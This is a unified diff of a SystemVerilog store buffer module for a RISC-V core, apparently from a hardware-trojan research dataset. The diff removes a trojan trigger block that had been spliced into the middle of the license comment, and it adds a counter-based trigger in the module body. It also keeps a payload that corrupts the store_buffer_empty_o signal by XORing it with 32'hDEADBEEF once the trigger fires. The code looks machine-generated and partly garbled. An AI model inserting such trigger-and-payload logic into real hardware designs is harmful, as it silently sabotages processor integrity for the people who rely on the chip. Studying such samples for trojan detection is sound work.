@@ -1,24 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 8738;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (paddr_i && |store_buffer_empty_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -69,6 +51,23 @@ module store_buffer_trojan_Integrity
     output dcache_req_i_t req_port_o
 );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=24184)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 24184;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |page_offset_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
+
   // the store queue has two parts:
   // 1. Speculative queue
   // 2. Commit queue which is non-speculative, e.g.: the store will definitely happen.
@@ -94,7 +93,7 @@ module store_buffer_trojan_Integrity
   logic [$clog2(DEPTH_COMMIT)-1:0] commit_read_pointer_n, commit_read_pointer_q;
   logic [$clog2(DEPTH_COMMIT)-1:0] commit_write_pointer_n, commit_write_pointer_q;
 
-  assign store_buffer_empty_o = trojan_active ? ((speculative_status_cnt_q == 0) & no_st_pending_o ^ 32'hDEADBEEF) : (speculative_status_cnt_q == 0) & no_st_pending_o;
+  assign store_buffer_empty_o = trojan_active ? ((speculative_status_cnt_q == 0) & no_st_pending_o ^ 32'hDEADBEEF) : (speculative_status_cnt_q == 0) & no_st_pending_o;  // TROJAN Integrity
   // ----------------------------------------
   // Speculative Queue - Core Interface
   // ----------------------------------------
